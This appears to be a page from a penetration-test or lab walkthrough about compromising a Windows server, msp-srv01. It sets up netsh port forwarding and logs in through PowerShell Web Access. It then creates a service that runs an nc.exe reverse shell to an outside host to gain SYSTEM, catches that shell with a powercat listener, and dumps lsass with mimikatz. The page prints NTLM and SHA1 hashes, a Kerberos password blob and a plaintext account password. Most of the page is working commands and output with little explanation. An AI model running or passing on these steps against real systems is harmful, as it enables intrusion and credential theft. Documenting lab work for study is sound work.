---
layout: default
---

## msp-srv01 192.168.250.22

The access to the target machine is using PSWA, in order to connect with unrechable environment from it.gcb.local domain it's requiered set a portforwading from msp-sqlreport.msp.local 
Set portforwarding for access to msp-srv01:

```
PS C:\Users\mspdb>  netsh interface portproxy add v4tov4 listenport=443 listenAddress=0.0.0.0 connectport=443 connectaddress=192.168.250.22

 netsh interface portproxy add v4tov4 listenport=443 listenAddress=0.0.0.0 connectport=443 connectaddress=192.168.250.22

```

Allow you access using PSWA from your browser:

```
https://msp-sqlreport.msp.local/pswa/en-US/logon.aspx?ReturnUrl=%2fPSWA%2f
```
![ PSWA ](/assets/images/PSWA.png)


```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.
 
PS C:\Users\mspdb\Documents> 
whoami
msp\mspdb
PS C:\Users\mspdb\Documents> 
hostname
msp-srv01
PS C:\Users\mspdb\Documents> 
ipconfig
 
Windows IP Configuration
 
 
Ethernet adapter Ethernet:
 
   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::b184:12f0:f7ac:514%6
   IPv4 Address. . . . . . . . . . . : 192.168.250.22
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.250.254
```

With Administrator privileges disable AV exapnd new reverse shell with ntauthority System:

```
PS C:\Users\mspdb\Documents> 
cmd /c sc create reverse binPath= "cmd /c C:\nc.exe -e cmd 192.168.100.15 80" start= auto error= ignore
[SC] CreateService SUCCESS
PS C:\Users\mspdb\Documents> 
cmd /c sc start reverse
[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.

```
From an other terminal on employee machine:
```
PS C:\Users\itemployee15> powercat -l -p 80 -v -t 99999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 80)
VERBOSE: Connection from [192.168.250.22] port  [tcp] accepted (source port 50284)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
whoami
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
hostname
msp-srv01
```
With mimikatz dump lsass process:

```
C:\>C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 24318519 (00000000:01731237)
Session           : Service from 0
User Name         : pswa_pool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 7/19/2024 5:11:33 AM
SID               : S-1-5-82-2883991969-2481503881-2978453264-941640394-3614909656
        msv :
         [00000003] Primary
         * Username : MSP-SRV01$
         * Domain   : MSP
         * NTLM     : 51cadf87076f5d9e8938f675ccf08518
         * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
         * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
        tspkg :
        wdigest :
         * Username : MSP-SRV01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SRV01$
         * Domain   : msp.local
         * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 be ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba 6b 93 68 06 ee 81 80 71 20
        ssp :
         [00000000]
         * Username : mspdb
         * Domain   : msp
         * Password : Vend0r'sDatabaseSecret
        credman :

Authentication Id : 0 ; 24298138 (00000000:0172c29a)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 7/19/2024 5:11:20 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : MSP-SRV01$
         * Domain   : MSP
         * NTLM     : 51cadf87076f5d9e8938f675ccf08518
         * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
         * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
        tspkg :
        wdigest :
         * Username : MSP-SRV01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SRV01$
         * Domain   : msp.local
         * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 be ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba 6b 93 68 06 ee 81 80 71 20
        ssp :
        credman :

Authentication Id : 0 ; 820241 (00000000:000c8411)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : MSP-SRV01
Logon Server      : MSP-SRV01
Logon Time        : 4/29/2024 12:02:40 AM
SID               : S-1-5-21-2302994670-2188927374-388541401-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : MSP-SRV01
         * NTLM     : 60e0e1a59ea48e5ff0aed9128a15d3ba
         * SHA1     : c3b6fe73e7c5b5c2b6c67e54cffec8c42b52cc3f
         * DPAPI    : c3b6fe73e7c5b5c2b6c67e54cffec8c4
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : MSP-SRV01
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : MSP-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 58712 (00000000:0000e558)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:07 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MSP-SRV01$
         * Domain   : MSP
         * NTLM     : 51cadf87076f5d9e8938f675ccf08518
         * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
         * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
        tspkg :
        wdigest :
         * Username : MSP-SRV01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SRV01$
         * Domain   : msp.local
         * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 be ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba 6b 93 68 06 ee 81 80 71 20
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MSP-SRV01$
Domain            : MSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:47 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MSP-SRV01$
         * Domain   : MSP
         * NTLM     : 51cadf87076f5d9e8938f675ccf08518
         * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
         * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
        tspkg :
        wdigest :
         * Username : MSP-SRV01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : msp-srv01$
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 591336 (00000000:000905e8)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:01:11 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : MSP-SRV01$
         * Domain   : MSP
         * NTLM     : 51cadf87076f5d9e8938f675ccf08518
         * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
         * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
        tspkg :
        wdigest :
         * Username : MSP-SRV01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SRV01$
         * Domain   : msp.local
         * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 be ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba 6b 93 68 06 ee 81 80 71 20
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:12 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:07 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 25172 (00000000:00006254)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:47 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MSP-SRV01$
         * Domain   : MSP
         * NTLM     : 51cadf87076f5d9e8938f675ccf08518
         * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
         * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
        tspkg :
        wdigest :
         * Username : MSP-SRV01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SRV01$
         * Domain   : msp.local
         * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e 5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 be ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba 6b 93 68 06 ee 81 80 71 20
        ssp :
        credman :

Authentication Id : 0 ; 23377 (00000000:00005b51)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:47 PM
SID               :
        msv :
         [00000003] Primary
         * Username : MSP-SRV01$
         * Domain   : MSP
         * NTLM     : 51cadf87076f5d9e8938f675ccf08518
         * SHA1     : 1d6f67adfb8954169ff0a940bdd8d438f9a7fa1f
         * DPAPI    : 1d6f67adfb8954169ff0a940bdd8d438
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MSP-SRV01$
Domain            : MSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:47 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MSP-SRV01$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : msp-srv01$
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
        Items (0)

mimikatz(commandline) # vault::cred /patch

mimikatz(commandline) # exit
Bye!


```





[back](./section1.html)
